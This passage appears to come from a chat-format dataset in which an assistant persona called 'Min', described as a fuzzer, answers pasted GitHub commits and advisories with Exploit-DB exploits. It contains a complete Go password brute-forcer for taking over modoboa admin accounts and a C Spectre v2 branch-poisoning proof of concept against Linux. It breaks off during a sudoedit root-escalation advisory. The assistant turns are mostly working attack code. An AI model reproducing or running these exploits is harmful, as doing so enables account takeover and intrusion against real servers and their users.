SenderAddressViewSet(GetThrottleViewsetMixin, lib_viewsets.RevisionModelMixin,\n\n viewsets.ModelViewSet):\n\n \"\"\"View set for SenderAddress model.\"\"\"\nExpand Down\n            1 change: 1 addition & 0 deletions\n          \n1 \n\nmodoboa/admin/api/v2/tests.py\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -224,6 +224,7 @@ def test_create_with_bad_password(self):\n\n self.assertIn(\"password\", resp.json())\n\n def test_validate(self):\n\n \"\"\"Test validate and throttling.\"\"\"\n\n data = {\"username\": \"toto@test.com\"}\n\n url = reverse(\"v2:account-validate\")\n\n resp = self.client.post(url, data, format=\"json\")\nExpand Down\n            10 changes: 6 additions & 4 deletions\n          \n10 \n\nmodoboa/admin/api/v2/viewsets.py\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -16,6 +16,7 @@\n\nfrom modoboa.core import models as core_models\n\nfrom modoboa.lib import renderers as lib_renderers\n\nfrom modoboa.lib import viewsets as lib_viewsets\n\nfrom modoboa.lib.throttle import GetThrottleViewsetMixin\n\nfrom ... import lib\n\nfrom ... import models\nExpand All\n\n@@ -40,7 +41,7 @@\n\n summary=\"Delete a particular domain\"\n\n    ),\n\n)\n\nclass DomainViewSet(lib_viewsets.RevisionModelMixin,\n\nclass DomainViewSet(GetThrottleViewsetMixin, lib_viewsets.RevisionModelMixin,\n\n mixins.ListModelMixin,\n\n mixins.RetrieveModelMixin,\n\n mixins.CreateModelMixin,\nExpand Down\n\nExpand Up\n\n@@ -160,6 +161,7 @@ class AccountViewSet(v1_viewsets.AccountViewSet):\n\n filter_backends = (filters.SearchFilter, dj_filters.DjangoFilterBackend)\n\n filterset_class = AccountFilterSet\n\n def get_serializer_class(self):\n\n if self.action in [\"create\", \"validate\", \"update\", \"partial_update\"]:\n\n return serializers.WritableAccountSerializer\nExpand Down\n\nExpand Up\n\n@@ -208,7 +210,7 @@ def delete(self, request, **kwargs):\n\n return response.Response(status=status.HTTP_204_NO_CONTENT)\n\nclass IdentityViewSet(viewsets.ViewSet):\n\nclass IdentityViewSet(GetThrottleViewsetMixin, viewsets.ViewSet):\n\n \"\"\"Viewset for identities.\"\"\"\n\n permission_classes = (permissions.IsAuthenticated, )\nExpand Down\n\nExpand Up\n\n@@ -270,7 +272,7 @@ def random_address(self, request, **kwargs):\n\n        })\n\nclass UserAccountViewSet(viewsets.ViewSet):\n\nclass UserAccountViewSet(GetThrottleViewsetMixin, viewsets.ViewSet):\n\n \"\"\"Viewset for current user operations.\"\"\"\n\n @action(methods=[\"get\", \"post\"], detail=False)\nExpand Down\n\nExpand Up\n\n@@ -323,7 +325,7 @@ def forward(self, request, **kwargs):\n\n return response.Response(serializer.validated_data)\n\nclass AlarmViewSet(viewsets.ReadOnlyModelViewSet):\n\nclass AlarmViewSet(GetThrottleViewsetMixin, viewsets.ReadOnlyModelViewSet):\n\n \"\"\"Viewset for Alarm.\"\"\"\n\n filter_backends = (filters.OrderingFilter, filters.SearchFilter, )\nExpand Down\n            6 changes: 5 additions & 1 deletion\n          \n6 \n\nmodoboa/core/api/v1/viewsets.py\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -5,14 +5,18 @@\n\nimport django_otp\n\nfrom django_otp.plugins.otp_static.models import StaticDevice, StaticToken\n\nfrom django_otp.plugins.otp_totp.models import TOTPDevice\n\nfrom rest_framework import permissions, response, viewsets\n\nfrom rest_framework.decorators import action\n\nfrom drf_spectacular.utils import extend_schema\n\nfrom modoboa.lib.throttle import GetThrottleViewsetMixin\n\nfrom . import serializers\n\nclass AccountViewSet(viewsets.ViewSet):\n\nclass AccountViewSet(GetThrottleViewsetMixin, viewsets.ViewSet):\n\n \"\"\"Account viewset.\n\n    Contains endpoints used to manipulate current user's account.\nExpand Down\n            28 changes: 28 additions & 0 deletions\n          \n28 \n\nmodoboa/core/api/v2/views.py\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -16,6 +16,7 @@\n\nfrom modoboa.core.password_hashers import get_password_hasher\n\nfrom modoboa.core.utils import check_for_updates\n\nfrom modoboa.lib.throttle import UserLesserDdosUser, LoginThrottle, PasswordResetApplyThrottle, PasswordResetRequestThrottle, PasswordResetTotpThrottle\n\nfrom modoboa.parameters import tools as param_tools\n\nfrom smtplib import SMTPException\nExpand All\n\n@@ -25,9 +26,20 @@\n\nlogger = logging.getLogger(\"modoboa.auth\")\n\ndef delete_cache_key(class_target, throttles, request):\n\n \"\"\"Attempt to delete cache key from throttling on login/password reset success.\"\"\"\n\n for throttle in throttles:\n\n if type(throttle) == class_target:\n\n throttle.reset_cache(request)\n\n return\n\nclass TokenObtainPairView(jwt_views.TokenObtainPairView):\n\n \"\"\"We overwrite this view to deal with password scheme update.\"\"\"\n\n throttle_classes = [LoginThrottle]\n\n def post(self, request, *args, **kwargs):\n\n serializer = self.get_serializer(data=request.data)\n\n try:\nExpand All\n\n@@ -42,6 +54,10 @@ def post(self, request, *args, **kwargs):\n\n user = serializer.user\n\n login(request, user)\n\n # Reset login throttle\n\n delete_cache_key(LoginThrottle, self.get_throttles(), request)\n\n logger.info(\n\n _(\"User '%s' successfully logged in\"), user.username\n\n        )\nExpand Down\n\nExpand Up\n\n@@ -85,6 +101,8 @@ class EmailPasswordResetView(APIView):\n\n    An Api View which provides a method to request a password reset token based on an e-mail address.\n\n    \"\"\"\n\n throttle_classes = [PasswordResetRequestThrottle]\n\n def post(self, request, *args, **kwargs):\n\n serializer = serializers.PasswordRecoveryEmailSerializer(\n\n data=request.data, context={'request': request})\nExpand All\n\n@@ -96,6 +114,7 @@ def post(self, request, *args, **kwargs):\n\n \"type\": \"email\",\n\n \"reason\": \"Error while sending the email. Please contact an administrator.\"\n\n            }, 503)\n\n # Email response\n\n return response.Response({\"type\": \"email\"}, 200)\nExpand All\n\n@@ -114,13 +133,16 @@ def post(self, request, *args, **kwargs):\n\n serializer.is_valid(raise_exception=True)\n\n except serializers.NoSMSAvailable:\n\n return super().post(request, *args, **kwargs)\n\n # SMS response\n\n return response.Response({\"type\": \"sms\"}, 200)\n\nclass PasswordResetSmsTOTP(APIView):\n\n \"\"\" Check SMS Totp code. \"\"\"\n\n throttle_classes = [PasswordResetTotpThrottle]\n\n def post(self, request, *args, **kwargs):\n\n try:\n\n if request.data[\"type\"] == \"confirm\":\nExpand All\n\n@@ -140,12 +162,15 @@ def post(self, request, *args, **kwargs):\n\n \"id\": serializer_response[1],\n\n \"type\": \"confirm\"\n\n            })\n\n delete_cache_key(PasswordResetTotpThrottle, self.get_throttles(), request)\n\n return response.Response(payload, 200)\n\nclass PasswordResetConfirmView(APIView):\n\n \"\"\" Get and set new user password. \"\"\"\n\n throttle_classes = [PasswordResetApplyThrottle]\n\n def post(self, request, *args, **kwargs):\n\n serializer = serializers.PasswordRecoveryConfirmSerializer(\n\n data=request.data)\nExpand All\n\n@@ -159,12 +184,15 @@ def post(self, request, *args, **kwargs):\n\n data.update({\"errors\": errors})\n\n return response.Response(data, 400)\n\n serializer.save()\n\n delete_cache_key(PasswordResetApplyThrottle, self.get_throttles(), request)\n\n return response.Response(status=200)\n\nclass ComponentsInformationAPIView(APIView):\n\n \"\"\"Retrieve information about installed components.\"\"\"\n\n throttle_classes = [UserLesserDdosUser]\n\n @extend_schema(responses=serializers.ModoboaComponentSerializer(many=True))\n\n def get(self, request, *args, **kwargs):\n\n status, extensions = check_for_updates()\nExpand Down\n      Oops, something went wrong.\n            Retry\n\nToggle all file notes\nToggle all file annotations\n\n    0 comments\n    on commit 47d17ac\n\n  \n\n    Please\n  sign in to comment.\n\n \n\nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionsAuthentication Bypass by Primary Weakness in GitHub repository modoboa/modoboa prior to 2.0.4.\n\nexploit\n/python/webapps/51276.go\n/* # Exploit Title: modoboa  2.0.4 - Admin TakeOver\n# Description: Authentication Bypass by Primary Weakness\n# Date: 02/10/2023\n# Software Link: https://github.com/modoboa/modoboa\n# Version: modoboa/modoboa prior to 2.0.4\n# Tested on: Arch Linux\n# Exploit Author: 7h3h4ckv157\n# CVE: CVE-2023-0777\n\n\n*/\n\npackage main\n\nimport (\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"net/http\"\n\t\"os\"\n\t\"strings\"\n\t\"time\"\n)\n\nfunc main() {\n\tfmt.Println(\"\\n\\t*** ADMIN TAKEOVER ***\\n\")\n\thost := getInput(\"Enter the target host: \")\n\tusername := getInput(\"Enter the Admin's Name: \")\n\tpasswordFile := getInput(\"Provide the path for Password-Wordlist: \")\n\n\n\tpasswords, err := readLines(passwordFile)\n\tif err != nil {\n\t\tfmt.Println(\"Error reading password file:\", err)\n\t\tos.Exit(1)\n\t}\n\n\tfor _, password := range passwords {\n\t\tdata := fmt.Sprintf(\"-----------------------------25524418606542250161357131552\\r\\nContent-Disposition: form-data; name=\\\"username\\\"\\r\\n\\r\\n%s\\r\\n-----------------------------25524418606542250161357131552\\r\\nContent-Disposition: form-data; name=\\\"password\\\"\\r\\n\\r\\n%s\\r\\n-----------------------------25524418606542250161357131552--\\r\\n\\r\\n\", username, password)\n\n\t\theaders := map[string]string{\n\t\t\t\"Host\":           host,\n\t\t\t\"User-Agent\":     \"Anonymous\",\n\t\t\t\"Accept\":         \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\",\n\t\t\t\"Accept-Language\": \"en-US,en;q=0.5\",\n\t\t\t\"Accept-Encoding\": \"gzip, deflate\",\n\t\t\t\"Content-Type\":   \"multipart/form-data; boundary=---------------------------25524418606542250161357131552\",\n\t\t}\n\n\t\tresp, err := postRequest(fmt.Sprintf(\"https://%s/api/v2/token/\", host), headers, data)\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Error sending request:\", err)\n\t\t\tos.Exit(1)\n\t\t}\n\n\t\tif resp.StatusCode == 200 {\n\t\t\tfmt.Printf(\"\\n\\tValid password Found: %s\\n\", password)\n\t\t\tbreak\n\t\t} else {\n\t\t\tfmt.Printf(\"Invalid password: %s\\n\", password)\n\t\t}\n\n\t\t// Delay the next request to limit the requests per second\n\t\tdelay := time.Duration(1000000000/50) * time.Nanosecond\n\t\ttime.Sleep(delay)\n\t}\n}\n\n// Read the lines from a file and return them as a slice of strings\nfunc readLines(filename string) ([]string, error) {\n\tcontent, err := ioutil.ReadFile(filename)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\treturn strings.Split(string(content), \"\\n\"), nil\n}\n\n// Send a POST request with the given headers and data\nfunc postRequest(url string, headers map[string]string, data string) (*http.Response, error) {\n\treq, err := http.NewRequest(\"POST\", url, strings.NewReader(data))\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tfor key, value := range headers {\n\t\treq.Header.Set(key, value)\n\t}\n\tclient := &http.Client{}\n\tresp, err := client.Do(req)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\treturn resp, nil\n}\n\n// Get user input and return the trimmed value\nfunc getInput(prompt string) string {\n\tfmt.Print(prompt)\n\tvar input string\n\tfmt.Scanln(&input)\n\treturn strings.TrimSpace(input)\n}\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://github.com/torvalds/linux/commit/6921ed9049bc7457f66c1596c5b78aec0dae4a9d\nx86/speculation: Allow enabling STIBP with legacy IBRS · torvalds/linux@6921ed9 · GitHub\n\nSkip to content\n\nNavigation Menu\n\nToggle navigation\n          Sign in\n        \n \n\n        Product\n        \nActions\n        Automate any workflow\n      \n\nPackages\n        Host and manage packages\n      \n\nSecurity\n        Find and fix vulnerabilities\n      \n\nCodespaces\n        Instant dev environments\n      \n\nGitHub Copilot\n        Write better code with AI\n      \n\nCode review\n        Manage code changes\n      \n\nIssues\n        Plan and track work\n      \n\nDiscussions\n        Collaborate outside of code\n      \nExplore\n\n      All features\n\n    \n\n      Documentation\n\n    \n\n      GitHub Skills\n\n    \n\n      Blog\n\n    \n\n        Solutions\n        \n\nFor\n\n      Enterprise\n\n    \n\n      Teams\n\n    \n\n      Startups\n\n    \n\n      Education\n\n    \nBy Solution\n\n      CI/CD & Automation\n\n    \n\n      DevOps\n\n    \n\n      DevSecOps\n\n    \nResources\n\n      Learning Pathways\n\n    \n\n      White papers, Ebooks, Webinars\n\n    \n\n      Customer Stories\n\n    \n\n      Partners\n\n    \n\n        Open Source\n        \n\nGitHub Sponsors\n        Fund open source developers\n      \nThe ReadME Project\n        GitHub community articles\n      \nRepositories\n\n      Topics\n\n    \n\n      Trending\n\n    \n\n      Collections\n\n    \n\n        Enterprise\n        \nEnterprise platform\n        AI-powered developer platform\n      \nAvailable add-ons\n\nAdvanced Security\n        Enterprise-grade security features\n      \n\nGitHub Copilot\n        Enterprise-grade AI features\n      \n\nPremium Support\n        Enterprise-grade 24/7 support\n      \nPricing\nSearch or jump to...\n\nSearch code, repositories, users, issues, pull requests...\n\n \n        Search\n      \n\nClear\n \n\n \n              Search syntax tips\n \n        Provide feedback\n      \n\n \nWe read every piece of feedback, and take your input very seriously.\nInclude my email address so I can be contacted\n     Cancel\n\n    Submit feedback\n        Saved searches\n      \nUse saved searches to filter your results more quickly\n\n \n\nName\nQuery\n\n            To see all available qualifiers, see our documentation.\n          \n \n\n     Cancel\n\n    Create saved search\n              Sign in\n            \n              Sign up\n            \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n\n        torvalds\n \n/\n\nlinux\n\nPublic\n\n \n\nNotifications\n You must be signed in to change notification settings\n \n\nFork\n    52.3k\n \n          Star\n 173k\n  \nCode\n\nPull requests\n355\nActions\n\nProjects\n0\nSecurity\n\nInsights\n\n \n\n \nAdditional navigation options\n \n          Code\n          Pull requests\n          Actions\n          Projects\n          Security\n          Insights\n\n \n\nCommit\n\nPermalink\n\nThis commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.\n\n          x86/speculation: Allow enabling STIBP with legacy IBRS\n        \n\nBrowse files\nBrowse the repository at this point in the history\n\nWhen plain IBRS is enabled (not enhanced IBRS), the logic in\nspectre_v2_user_select_mitigation() determines that STIBP is not needed.\n\nThe IBRS bit implicitly protects against cross-thread branch target\ninjection. However, with legacy IBRS, the IBRS bit is cleared on\nreturning to userspace for performance reasons which leaves userspace\nthreads vulnerable to cross-thread branch target injection against which\nSTIBP protects.\n\nExclude IBRS from the spectre_v2_in_ibrs_mode() check to allow for\nenabling STIBP (through seccomp/prctl() by default or always-on, if\nselected by spectre_v2_user kernel cmdline parameter).\n\n  [ bp: Massage. ]\n\nFixes: 7c693f5 (\"x86/speculation: Add spectre_v2=ibrs option to support Kernel IBRS\")\nReported-by: José Oliveira <joseloliveira11@gmail.com>\nReported-by: Rodrigo Branco <rodrigo@kernelhacking.com>\nSigned-off-by: KP Singh <kpsingh@kernel.org>\nSigned-off-by: Borislav Petkov (AMD) <bp@alien8.de>\nCc: stable@vger.kernel.org\nLink: https://lore.kernel.org/r/20230220120127.1975241-1-kpsingh@kernel.org\nLink: https://lore.kernel.org/r/20230221184908.2349578-1-kpsingh@kernel.org\n\nLoading branch information\n\n \nKP Singh\n    \n  authored and\n  bp3tk0v\n  committed\n  Feb 27, 2023\n\n        1 parent\n          \n          8779347\n\ncommit 6921ed9\n\n      Showing\n      1 changed file\n      with\n      18 additions\n      and\n      7 deletions.\n    \n \nWhitespace\n \nIgnore whitespace\n\n \nSplit\n \nUnified\n \n \n        There are no files selected for viewing\n\n \n\n            25 changes: 18 additions & 7 deletions\n          \n25 \n\narch/x86/kernel/cpu/bugs.c\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -1133,14 +1133,18 @@ spectre_v2_parse_user_cmdline(void)\n\n return SPECTRE_V2_USER_CMD_AUTO;\n\n}\n\nstatic inline bool spectre_v2_in_ibrs_mode(enum spectre_v2_mitigation mode)\n\nstatic inline bool spectre_v2_in_eibrs_mode(enum spectre_v2_mitigation mode)\n\n{\n\n return mode == SPECTRE_V2_IBRS ||\n\n mode == SPECTRE_V2_EIBRS ||\n\n return mode == SPECTRE_V2_EIBRS ||\n\n mode == SPECTRE_V2_EIBRS_RETPOLINE ||\n\n mode == SPECTRE_V2_EIBRS_LFENCE;\n\n}\n\nstatic inline bool spectre_v2_in_ibrs_mode(enum spectre_v2_mitigation mode)\n\n{\n\n return spectre_v2_in_eibrs_mode(mode) || mode == SPECTRE_V2_IBRS;\n\n}\n\nstatic void __init\n\nspectre_v2_user_select_mitigation(void)\n\n{\nExpand Down\n\nExpand Up\n\n@@ -1203,12 +1207,19 @@ spectre_v2_user_select_mitigation(void)\n\n\t}\n\n /*\n\n\t * If no STIBP, IBRS or enhanced IBRS is enabled, or SMT impossible,\n\n\t * STIBP is not required.\n\n\t * If no STIBP, enhanced IBRS is enabled, or SMT impossible, STIBP\n\n\t * is not required.\n\n\t *\n\n\t * Enhanced IBRS also protects against cross-thread branch target\n\n\t * injection in user-mode as the IBRS bit remains always set which\n\n\t * implicitly enables cross-thread protections.  However, in legacy IBRS\n\n\t * mode, the IBRS bit is set only on kernel entry and cleared on return\n\n\t * to userspace. This disables the implicit cross-thread protection,\n\n\t * so allow for STIBP to be selected in that case.\n\n\t */\n\n if (!boot_cpu_has(X86_FEATURE_STIBP) ||\n\n\t    !smt_possible ||\n\n spectre_v2_in_ibrs_mode(spectre_v2_enabled))\n\n spectre_v2_in_eibrs_mode(spectre_v2_enabled))\n\n return;\n\n /*\nExpand Down\n\nExpand Up\n\n@@ -2340,7 +2351,7 @@ static ssize_t mmio_stale_data_show_state(char *buf)\n\nstatic char *stibp_state(void)\n\n{\n\n if (spectre_v2_in_ibrs_mode(spectre_v2_enabled))\n\n if (spectre_v2_in_eibrs_mode(spectre_v2_enabled))\n\n return \"\";\n\n switch (spectre_v2_user_stibp) {\nExpand Down\n\nToggle all file notes\nToggle all file annotations\n\n    0 comments\n    on commit 6921ed9\n\n  \n\n    Please\n  sign in to comment.\n\n \n\nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionsThe Linux kernel allows userspace processes to enable mitigations by calling prctl with PR_SET_SPECULATION_CTRL which disables the speculation feature as well as by using seccomp. We had noticed that on VMs of at least one major cloud provider, the kernel still left the victim process exposed to attacks in some cases even after enabling the spectre-BTI mitigation with prctl. The same behavior can be observed on a bare-metal machine when forcing the mitigation to IBRS on boot command line.\n\nThis happened because when plain IBRS was enabled (not enhanced IBRS), the kernel had some logic that determined that STIBP was not needed. The IBRS bit implicitly protects against cross-thread branch target injection. However, with legacy IBRS, the IBRS bit was cleared on returning to userspace, due to performance reasons, which disabled the implicit STIBP and left userspace threads vulnerable to cross-thread branch target injection against which STIBP protects.\n\n\n\n\nexploit\n/linux/local/51384.txt\n## Exploit Title: Linux Kernel 6.2 -  Userspace Processes To Enable Mitigation\n## Exploit Author: nu11secur1ty\n## CVE ID: CVE-2023-1998\n\n## Description\n## Summary\nThe Linux kernel allows userspace processes to enable mitigations by\ncalling prctl with\n[PR_SET_SPECULATION_CTRL](https://docs.kernel.org/userspace-api/spec_ctrl.html)\nwhich disables the speculation feature as well as by using seccomp. We\nhad noticed that on VMs of at least one major cloud provider, the\nkernel still left the victim process exposed to attacks in some cases\neven after enabling the spectre-BTI mitigation with prctl. The same\nbeahaviour can be observed on a bare-metal machine when forcing the\nmitigation to IBRS on boot comand line.\n\nThis happened because when plain IBRS was enabled (not enhanced IBRS),\nthe kernel had some logic that determined that\n[STIBP](https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/technical-documentation/single-thread-indirect-branch-predictors.html)\nwas not needed. The IBRS bit implicitly protects against cross-thread\nbranch target injection. However, with legacy\n[IBRS](https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/technical-documentation/indirect-branch-restricted-speculation.html),\nthe IBRS bit was cleared on returning to userspace, due to performance\nreasons, which disabled the implicit STIBP and left userspace threads\nvulnerable to cross-thread branch target injection against which STIBP\nprotects.\n\n## Severity\nMedium - The kernel failed to protect applications that attempted to\nprotect against Spectre v2 leaving them open to attack from other\nprocesses running on the same physical core in another hyperthread.\n\n## Vulnerable code\nThe Bug present on Kernel 6.2\n(https://elixir.bootlin.com/linux/v6.2/source/arch/x86/kernel/cpu/bugs.c#L1196)\nimplements an optimization that disables STIBP if the mitgation is\nIBRS or eIBRS. However IBRS doesn't mitigate SMT attacks on userspace\nas eIBRS does. Setting spectre_v2=ibrs on kernel boot parameters for\nbare metal machines without eIBRS support also triggers the bug.\n\n```c\n        /*\n         * If no STIBP, IBRS or enhanced IBRS is enabled, or SMT impossible,\n         * STIBP is not required.\n         */\n        if (!boot_cpu_has(X86_FEATURE_STIBP) ||\n            !smt_possible ||\n            spectre_v2_in_ibrs_mode(spectre_v2_enabled))\n                return;\n```\n## Proof of Concept\nThe test consists of two processes. The attacker constantly poisons an\nindirect call to speculatively redirect it to a target address. The\nvictim process measures the mispredict rate and tries to mitigate the\nattack either by calling PRCTL or writing to the MSR directly using a\nkernel module that exposes MSR read and write operations to userspace.\n\n```c\n/*\ngcc -o victim test.c -O0 -masm=intel -w                 -DVICTIM\ngcc -o victim-PRCTL test.c -O0 -masm=intel -w   -DVICTIM  -DPRCTL\ngcc -o victim-nospecctrl test.c -O0 -masm=intel -w      -DVICTIM\n-DMSR  -DMSR_VAL=0\ngcc -o victim-IBRS test.c -O0 -masm=intel -w    -DVICTIM  -DMSR  -DMSR_VAL=1\ngcc -o victim-STIBP test.c -O0 -masm=intel -w   -DVICTIM  -DMSR  -DMSR_VAL=2\ngcc -o victim-IBPB test.c -O0 -masm=intel -w    -DVICTIM  -DMSR\n-DMSR_VAL=0 -DIBPB\ngcc -o attacker test.c -O0 -masm=intel -w\n*/\n#include \"utils.h\"\n#include <stdio.h>\n#include <string.h>\n#include <sys/prctl.h>\n\n#ifndef PRINT_AMMOUNT\n#define PRINT_AMMOUNT 1000\n#endif\n\n#define IA32_SPEC_CTRL 72\n\nuint8_t *rdiPtr;\nuint8_t unused[0x500];\nuint8_t probeArray[0x1000] = {2};\nuint8_t unuse2[0x500];\n\nuint32_t f1() {}\n\nint poison(uint8_t *srcAddress, uint8_t *dstAddress, uint64_t cpu)\n{\n    volatile uint8_t d;\n\n    unsigned tries = 0;\n    unsigned hits = 0;\n    unsigned totalHits = 0;\n    unsigned totalTries = 0;\n\n    jitForLoop(srcAddress);\n\n    while (1)\n    {\n\n#ifndef VICTIM\n        callGadget(srcAddress, (uint8_t *)&rdiPtr, (uint8_t *)probeArray);\n        continue;\n#else\n\n#ifdef IBPB\n        wrmsr_on_cpu(73, cpu, 1);\n#endif\n        for (int i = 0; i < 100; i++)\n        {\n            d = *dstAddress;\n            flush((uint8_t *)&rdiPtr);\n            callGadget(srcAddress, (uint8_t *)&rdiPtr, (uint8_t *)probeArray);\n        }\n\n        if (probe(&probeArray[0]) < THRESHOLD)\n        {\n            hits++;\n            totalHits++;\n        }\n\n        totalTries++;\n        if (++tries % PRINT_AMMOUNT == 0)\n        {\n\n            printf(\"Rate: %u/%u  MSR[72]=%d\\n\", hits,\ntries,rdmsr_on_cpu(IA32_SPEC_CTRL,cpu));\n            #ifdef MSR\n            wrmsr_on_cpu(IA32_SPEC_CTRL, cpu, MSR_VAL);\n            #endif\n            tries = 0;\n            hits = 0;\n            if (totalTries >= PRINT_AMMOUNT * 10)\n            {\n                break;\n            }\n        }\n        usleep(1);\n\n#endif\n    }\n\n    printf(\"Total mispredict rate: %d/%d (%.2f %)\\n\", totalHits,\ntotalTries, (float)totalHits * 100 / (float)totalTries);\n}\n\nint main(int argc, char **argv)\n{\n\n    uint64_t srcAddress;\n    uint64_t dstAddress;\n    uint64_t cpu;\n\n    if (argc < 4)\n    {\n        printf(\"Usage:   %s <srcAddress> <dstAddress> <cpuCore> \\n\", argv[0]);\n        printf(\"Example: %s 0x55555554123 0x55555555345 1 \\n\", argv[0]);\n        return 0;\n    }\n\n    srcAddress = (uint64_t)strtoull(argv[1], NULL, 16);\n    dstAddress = (uint64_t)strtoull(argv[2], NULL, 16);\n    cpu = (uint64_t)strtoull(argv[3], NULL, 16);\n    SetCoreAffinity(cpu);\n\n    uint8_t *rwx1 = requestMem((uint8_t *)(srcAddress & (~0xfffULL)), 0x1000);\n    uint8_t *rwx2 = requestMem((uint8_t *)(dstAddress & (~0xfffULL)), 0x1000);\n\n#ifdef PRCTL\n    if (prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH,\nPR_SPEC_FORCE_DISABLE, 0, 0) != 0)\n    {\n        perror(\"prctl\");\n    }\n    printf(\"PRCTL GET value 0x%x\\n\", prctl(PR_GET_SPECULATION_CTRL,\nPR_SPEC_INDIRECT_BRANCH, 0, 0, 0));\n#endif\n\n#ifdef MSR\n    printf(\"current value msr[%d]=%d on core %d\\n\", IA32_SPEC_CTRL,\nrdmsr_on_cpu(IA32_SPEC_CTRL, cpu), cpu);\n    wrmsr_on_cpu(IA32_SPEC_CTRL, cpu, MSR_VAL);\n    printf(\"writing msr[%d]=%d on core %d \\n\", IA32_SPEC_CTRL, MSR_VAL, cpu);\n    printf(\"current value msr[%d]=%d on core %d\\n\", IA32_SPEC_CTRL,\nrdmsr_on_cpu(IA32_SPEC_CTRL, cpu), cpu);\n#endif\n\n// set up leak gadget into position\n#ifdef VICTIM\n    rdiPtr = (uint8_t *)f1;\n    copyLeakGadget(dstAddress);\n#else\n    rdiPtr = (uint8_t *)dstAddress;\n    copyRetGadget(dstAddress);\n#endif\n\n    poison(srcAddress, dstAddress, cpu);\n\n#ifdef MSR\n    printf(\"current value msr[%d]=%d on core %d\\n\", IA32_SPEC_CTRL,\nrdmsr_on_cpu(IA32_SPEC_CTRL, cpu), cpu);\n#endif\n}\n```\n\n\nTimeline\n\n**Date reported** to Cloud providers: 31/12/2022\n\n**Date reported** to security@kernel.org: 20/02/2022\n\n**Date fixed:** 10/03/2023\n\n- [torvalds/linux@6921ed9](https://github.com/torvalds/linux/commit/6921ed9049bc7457f66c1596c5b78aec0dae4a9d)\n\n- https://kernel.dance/#6921ed9049bc7457f66c1596c5b78aec0dae4a9d\n\nDate disclosed: 12/04/2023\n\n\n--\nSystem Administrator - Infrastructure Engineer\nPenetration Testing Engineer\nExploit developer at https://packetstormsecurity.com/\nhttps://cve.mitre.org/index.html\nhttps://cxsecurity.com/ and https://www.exploit-db.com/\n0day Exploit DataBase https://0day.today/\nhome page: https://www.nu11secur1ty.com/\nhiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=\n                          nu11secur1ty <http://nu11secur1ty.com/>\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttp://seclists.org/fulldisclosure/2023/Aug/21\nFull Disclosure: KL-001-2023-003: Cisco ThousandEyes Enterprise Agent Virtual Appliance Arbitrary File Modification via sudoedit\n\nNmap.org\nNpcap.com\nSeclists.org\nSectools.org\nInsecure.org\nFull Disclosure\nmailing list archives\n\nBy Date\nBy Thread\nKL-001-2023-003: Cisco ThousandEyes Enterprise Agent Virtual Appliance Arbitrary File Modification via sudoedit\n\nFrom: KoreLogic Disclosures via Fulldisclosure <fulldisclosure () seclists org>\nDate: Thu, 17 Aug 2023 14:46:21 -0500\nKL-001-2023-003: Cisco ThousandEyes Enterprise Agent Virtual Appliance Arbitrary File Modification via sudoedit\n\nTitle: Cisco ThousandEyes Enterprise Agent Virtual Appliance Arbitrary File Modification via sudoedit\nAdvisory ID: KL-001-2023-003\nPublication Date: 2023.08.17\nPublication URL: https://korelogic.com/Resources/Advisories/KL-001-2023-003.txt\n1. Vulnerability Details\n\n     Affected Vendor: ThousandEyes\n     Affected Product: ThousandEyes Enterprise Agent Virtual Appliance\n     Affected Version: thousandeyes-va-64-18.04 0.218\n     Platform: Linux / Ubuntu 18.04\n     CWE Classification: CWE-1395: Dependency on Vulnerable\n                         Third-Party Component\n     CVE ID: CVE-2023-22809\n2. Vulnerability Description\n\n     An unpatched vulnerability in 'sudoedit', allowed by sudo\n     configuration, permits a low-privilege user to modify arbitrary\n     files as root and subsequently execute arbitrary commands as\n     root.\n3. Technical Description\n\n   The ThousandEyes Virtual Appliance is distributed with\n   a restrictive set of commands that can be executed via\n   sudo, without having to provide the password for the\n   'thousandeyes' account. However, the ability to execute\n   sudoedit of a specific file (/etc/hosts) via sudo is permitted\n   without requiring the password. The sudoedit binary can\n   be abused to allow the modification of any file on the\n   filesystem. This is a known security vulnerability (per\n   https://seclists.org/oss-sec/2023/q1/42), but had not been\n   disclosed for the ThousandEyes Virtual Appliance. This can be\n   abused to allow root-level compromise of the virtual appliance.\n\n     thousandeyes@thousandeyes-va:~$ id\n     uid=1000(thousandeyes) 